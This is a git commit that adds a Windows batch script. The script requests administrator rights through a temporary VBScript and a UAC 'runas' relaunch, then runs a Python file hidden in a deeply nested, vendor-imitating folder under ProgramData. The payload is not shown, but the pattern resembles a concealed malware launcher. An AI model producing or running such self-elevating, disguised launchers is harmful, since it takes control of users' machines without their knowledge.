a6a8d3a3de6e8aa0310855cb1a4e74bd99b9010c
aiantics <98560497+aiantics@users.noreply.github.com>
2023-10-20 18:16:30 -0700

    Add files via upload

---
+++ D-VR90EX/DF990/B9022/DERL.bat
@@ -0,0 +1,23 @@
+@echo off
+:: BatchGotAdmin
+:-------------------------------------
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+if '%errorlevel%' NEQ '0' (
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+:: End BatchGotAdmin
+
+set "userprofilepath=%userprofile%"
+for %%F in ("%userprofilepath%") do set "username=%%~nxF"
+
+python "C:\ProgramData\ASUS\SCD\1404\Licenced\Seed\Env\Env\Env\Env\Env\Env\XME4.py"
+exit
